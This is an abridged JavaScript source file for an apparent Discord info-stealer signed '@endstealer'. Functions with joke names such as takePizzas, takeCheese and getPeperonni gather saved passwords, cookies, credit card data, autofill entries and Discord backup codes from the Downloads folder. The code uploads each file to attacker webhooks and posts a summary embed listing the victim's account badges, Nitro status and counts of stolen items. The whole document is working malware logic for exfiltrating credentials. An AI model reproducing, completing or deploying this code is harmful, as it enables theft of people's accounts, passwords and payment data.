...

...
async function getPeperonni() {
    ...
    if (fs.existsSync(`${homeDir}\\Downloads`)) {
        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                ...
                if(path) backupcodesc.push(path)
                str += `\n\n@~$~@end-${path}`,
    ...
    if (str !== '') {
        ...
        form2.append("file", fs.createReadStream(appdata + "\\backupcodes.txt"));
        form2.submit(dwbk);
    }
}
...
async function takeCreditcards() {
    ...
    form.submit(wbk);
        ...
        const form2 = new FormData();
        form2.append("file", fs.createReadStream(appdata + "\\creditcards.txt"));
        form2.submit(dwbk);
}
...
async function takeAutofilldata() {
    ...
    form.submit(wbk);
        ...
        const form2 = new FormData();
        form2.append("file", fs.createReadStream(appdata + "\\autofilldata.txt"));
        form2.submit(dwbk);
}
...
async function takePizzas() {
    ...
    form.submit(wbk);
        ...
        const form2 = new FormData();
        form2.append("file", fs.createReadStream(appdata + "\\passwords.txt"));
        form2.submit(dwbk);
}
...
async function takeCheese() {
    ...
    form.submit(wbk);
        ...
        const form2 = new FormData();
        form2.append("file", fs.createReadStream(appdata + "\\cookies.txt"));
        form2.submit(dwbk);
}
            ...
            embeds: [{
                "fields": [
                    ...
                    },
                    {
                        ...
                        value: getBadges(req.data.flags),
                        inline: true
                    },
                    {
                        name: `<:bby:987689935018549328> Nitro Type:`,
                        value: await getNitro(req.data.premium_type, req.data.id, token),
                        inline: true
                    },
                    {
                ...
                "author": {
                    ...
                    "icon_url": "https://cdn.discordapp.com/attachments/1062172623066382450/1062268670929281024/dea7a31cdf2929ad9c06acf9f5e376c6.png",
                },
                "footer": {
                    "text": "@endstealer"
                },
                "thumbnail": {
                    "url": `https://cdn.discordapp.com/avatars/${req.data.id}/${req.data.avatar}?size=512`
                }
            }, {
                "color": 3553599,
                "description": friends,
...
const badges = {
    ...
    Active_Developer: {
        Value: 4194304,
        Emoji: "<:active_dev:1062905737120071680>",
        Rare: true,
    }
};
...
axios.post(dwbk, {
    ...
    embeds: [{
        "fields": [
            {
                name: `<:end_pass:1062900516251766827> Passwords`,
                value: `\`\`\`${backpcodes.length}\`\`\``,
                inline: true
            },
            {
                name: `<:end_cookie:1062901398292942878> Cookies`,
                value: `\`\`\`562\`\`\``,
                inline: true
            },
            {
                name: `<:end_backup:1062901981498314843> Backup Codes`,
                value: `\`\`\`2\`\`\``,
                inline: true
            },
            {
                name: `<:end_tkn:1062902417563332740> Tokens`,
                value: `\`\`\`7\`\`\``,
                inline: true
            },
            {
                name: `<:end_cc:1062903214615314442> Credit Cards`,
                value: `\`\`\`0\`\`\``,
                inline: true
            },
            {
                name: `<:end_auto:1062905072331276321> AutoFill`,
                value: `\`\`\`1\`\`\``,
                inline: true
            },
        ],
